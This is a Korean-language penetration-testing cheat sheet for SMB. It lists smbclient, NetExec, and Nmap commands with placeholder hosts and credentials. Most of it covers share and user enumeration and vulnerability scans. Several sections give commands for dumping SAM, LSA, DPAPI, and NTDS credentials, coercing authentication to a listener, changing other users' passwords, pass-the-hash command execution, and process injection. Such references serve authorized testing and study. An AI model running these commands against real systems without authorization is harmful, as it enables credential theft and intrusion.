---
sidebar_position: 6
---

# SMB - 445

## 기본 정보

**포트**: 139 (SMB over NetBIOS), 445 (SMB Direct)

SMB(Server Message Block)는 파일 공유, 프린터 공유 등을 위한 프로토콜입니다.

## 마운트

```bash
# CIFS 마운트
mount.cifs //<RHOST>/<SHARE> /mnt/remote

# guestmount
guestmount --add '/<MOUNTPOINT>/<DIRECTORY/FILE>' --inspector --ro /mnt/<MOUNT> -v
```

## smbclient

```bash
# 공유 목록 조회
smbclient -L \\<RHOST>\ -N
smbclient -L //<RHOST>/ -N
smbclient -L ////<RHOST>/ -N
smbclient -L //<RHOST>// -U <USERNAME>%<PASSWORD>
smbclient -U "<USERNAME>" -L \\\\<RHOST>\\

# 공유 접속
smbclient //<RHOST>/<SHARE>
smbclient //<RHOST>/<SHARE> -U <USERNAME>
smbclient //<RHOST>/SYSVOL -U <USERNAME>%<PASSWORD>
smbclient "\\\\<RHOST>\<SHARE>"
smbclient --no-pass //<RHOST>/<SHARE>

# 성능 최적화 옵션
smbclient \\\\<RHOST>\\<SHARE> -U '<USERNAME>' --socket-options='TCP_NODELAY IPTOS_LOWDELAY SO_KEEPALIVE SO_RCVBUF=131072 SO_SNDBUF=131072' -t 40000
```

### 다중 파일 다운로드

```bash
# smbclient 내부에서
mask ""
recurse ON
prompt OFF
mget *
```

## NetExec - SMB 열거

### 공유 열거

```bash
# 기본 공유 열거
netexec smb <RHOST> -u '<USERNAME>' -p '<PASSWORD>' --shares

# 디렉토리 포함
netexec smb <RHOST> -u '<USERNAME>' -p '<PASSWORD>' --shares --dir

# 특정 폴더 조회
netexec smb <RHOST> -u '<USERNAME>' -p '<PASSWORD>' --shares --dir "<FOLDER>"

# 타임아웃 설정
netexec smb <RHOST> -u '<USERNAME>' -p '<PASSWORD>' --shares --smb-timeout 10
```

### 파일 다운로드

```bash
# Spider Plus 모듈
netexec smb <RHOST> -u '<USERNAME>' -p '<PASSWORD>' --shares -M spider_plus
netexec smb <RHOST> -u '<USERNAME>' -p '<PASSWORD>' --shares -M spider_plus -o READ_ONLY=false
netexec smb <RHOST> -u '<USERNAME>' -p '<PASSWORD>' --shares -M spider_plus -o DOWNLOAD_FLAG=true
netexec smb <RHOST> -u '<USERNAME>' -p '<PASSWORD>' --shares -M spider_plus -o DOWNLOAD_FLAG=true MAX_FILE_SIZE=99999999

# 단일 파일 다운로드
netexec smb <RHOST> -u '<USERNAME>' -p '<PASSWORD>' --share <SHARE> --get-file <FILE> <FILE>
```

### 파일 처리

```bash
# 파일 다운로드
netexec smb <RHOST> -u '<USERNAME>' -p '<PASSWORD>' --get-file \\PATH\\TO\FOLDER\\<FILE> /PATH/TO/FOLDER/<FILE>

# 파일 업로드
netexec smb <RHOST> -u '<USERNAME>' -p '<PASSWORD>' --put-file /PATH/TO/FILE/<FILE> \\PATH\\TO\FOLDER\\<FILE>
```

## NetExec - RID 브루트포스

```bash
# 기본 RID 브루트포스
netexec smb <RHOST> -u '<USERNAME>' -p '<PASSWORD>' --shares --rid-brute

# RID 범위 지정
netexec smb <RHOST> -u '<USERNAME>' -p '<PASSWORD>' --shares --rid-brute 100000

# 사용자만 필터링
netexec smb <RHOST> -u '<USERNAME>' -p '<PASSWORD>' --shares --rid-brute | grep 'SidTypeUser' | awk '{print $6}'

# 도메인 제거
netexec smb <RHOST> -u '<USERNAME>' -p '<PASSWORD>' --shares --rid-brute | grep 'SidTypeUser' | awk '{print $6}' | awk -F '\\' '{print $2}'
```

## NetExec - 취약점 스캔

```bash
# MS17-010 (EternalBlue)
netexec smb <RHOST> -u '' -p '' -M ms17-010

# SMBGhost
netexec smb <RHOST> -u '' -p '' -M smbghost

# ZeroLogon
netexec smb <RHOST> -u '' -p '' -M zerologon

# PrintNightmare
netexec smb <RHOST> -u '' -p '' -M printnightmare

# NoPac
netexec smb <RHOST> -u '<USERNAME>' -p '<PASSWORD>' -M nopac

# Coerce Plus
netexec smb <RHOST> -u '' -p '' -M coerce_plus
netexec smb <RHOST> -u '' -p '' -M coerce_plus -o LISTENER=<LHOST>
netexec smb <RHOST> -u '' -p '' -M coerce_plus -o LISTENER=<LHOST> ALWAYS=true
netexec smb <RHOST> -u '' -p '' -M coerce_plus -o METHOD=PetitPotam
```

## NetExec - 시스템 열거

```bash
# 사용자 열거
netexec smb <RHOST> -u '<USERNAME>' -p '<PASSWORD>' --users
netexec smb <RHOST> -u '<USERNAME>' -p '<PASSWORD>' --users-export <FILE>

# 그룹 열거
netexec smb <RHOST> -u '<USERNAME>' -p '<PASSWORD>' --groups
netexec smb <RHOST> -u '<USERNAME>' -p '<PASSWORD>' --local-group

# 비밀번호 정책
netexec smb <RHOST> -u '<USERNAME>' -p '<PASSWORD>' --pass-pol

# 디스크 정보
netexec smb <RHOST> -u '<USERNAME>' -p '<PASSWORD>' --disks

# SMB 세션
netexec smb <RHOST> -u '<USERNAME>' -p '<PASSWORD>' --smb-sessions

# 로그온 사용자
netexec smb <RHOST> -u '<USERNAME>' -p '<PASSWORD>' --loggedon-users

# 추가 모듈
netexec smb <RHOST> -u '<USERNAME>' -p '<PASSWORD>' -M powershell_history
netexec smb <RHOST> -u '<USERNAME>' -p '<PASSWORD>' -M bitlocker
netexec smb <RHOST> -u '<USERNAME>' -p '<PASSWORD>' -M enum_av
netexec smb <RHOST> -u '<USERNAME>' -p '<PASSWORD>' -M spooler
netexec smb <RHOST> -u '<USERNAME>' -p '<PASSWORD>' -M webdav
```

## NetExec - 자격증명 덤프

```bash
# SAM
netexec smb <RHOST> -u '<USERNAME>' -p '<PASSWORD>' --sam

# LSA
netexec smb <RHOST> -u '<USERNAME>' -p '<PASSWORD>' --lsa

# DPAPI
netexec smb <RHOST> -u '<USERNAME>' -p '<PASSWORD>' --dpapi
netexec smb <RHOST> -u '<USERNAME>' -p '<PASSWORD>' --dpapi cookies
netexec smb <RHOST> -u '<USERNAME>' -p '<PASSWORD>' --dpapi nosystem
netexec smb <RHOST> -u '<USERNAME>' -p '<PASSWORD>' --local-auth --dpapi nosystem

# NTDS
netexec smb <RHOST> -u '<USERNAME>' -p '<PASSWORD>' --ntds

# 추가 모듈
netexec smb <RHOST> -u '<USERNAME>' -p '<PASSWORD>' -M eventlog_creds
netexec smb <RHOST> -u '<USERNAME>' -p '<PASSWORD>' -M gpp_autologin
netexec smb <RHOST> -u '<USERNAME>' -p '<PASSWORD>' -M gpp_password
netexec smb <RHOST> -u '<USERNAME>' -p '<PASSWORD>' -M lsassy
netexec smb <RHOST> -u '<USERNAME>' -p '<PASSWORD>' -M nanodump
netexec smb <RHOST> -u '<USERNAME>' -p '<PASSWORD>' -M ntdsutil
netexec smb <RHOST> -u '<USERNAME>' -p '<PASSWORD>' -M backup_operator
netexec smb <RHOST> -u '<USERNAME>' -p '<PASSWORD>' -M putty
netexec smb <RHOST> -u '<USERNAME>' -p '<PASSWORD>' -M vnc
netexec smb <RHOST> -u '<USERNAME>' -p '<PASSWORD>' -M mremoteng
netexec smb <RHOST> -u '<USERNAME>' -p '<PASSWORD>' -M notepad
netexec smb <RHOST> -u '<USERNAME>' -p '<PASSWORD>' -M notepad++
```

## NetExec - Timeroasting

```bash
netexec smb <RHOST> -u '<USERNAME>' -p '<PASSWORD>' -M timeroast
```

## NetExec - 사용자 관리

```bash
# 비밀번호 변경 (자신)
netexec smb <RHOST> -u '<USERNAME>' -p '<PASSWORD>' -M change-password -o NEWPASS=<PASSWORD>

# 비밀번호 변경 (다른 사용자)
netexec smb <RHOST> -u '<USERNAME>' -p '<PASSWORD>' -M change-password -o USER=<USERNAME> NEWPASS=<PASSWORD>
```

## NetExec - 명령 실행

```bash
# 해시 사용
netexec smb <RHOST> -u '<USERNAME>' -H '<HASH>' -x <COMMAND>

# Process Injection
netexec smb <RHOST> -u '<USERNAME>' -M pi -o PID=<PID> EXEC=<COMMAND>
```

## Nmap

```bash
# SMB 버전 확인
sudo nmap -p139,445 -sV <RHOST>

# SMB 취약점 스캔
sudo nmap -p445 --script smb-vuln-* <RHOST>

# SMB OS Discovery
sudo nmap -p445 --script smb-os-discovery <RHOST>

# SMB 공유 열거
sudo nmap -p445 --script smb-enum-shares <RHOST>

# SMB 사용자 열거
sudo nmap -p445 --script smb-enum-users <RHOST>
```

## 참고

- Null Session 확인
- 익명 로그인 시도
- 약한 자격증명 테스트
- EternalBlue, SMBGhost 등 주요 취약점 확인
- LDAP 관련 명령어는 LDAP 섹션 참고
